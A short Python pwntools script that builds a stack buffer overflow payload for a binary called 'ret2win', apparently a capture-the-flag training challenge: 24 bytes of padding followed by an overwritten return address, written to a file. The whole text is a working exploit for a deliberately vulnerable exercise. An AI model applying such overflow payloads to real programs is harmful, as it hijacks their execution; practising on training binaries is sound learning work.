from pwn import *

exe = "./ret2win"

context.binary = binary = ELF(exe, checksec=False)

padding = b'A' * 24

payload = flat(
	padding,
	p64(0x4012d5)
	)

write('payload', payload)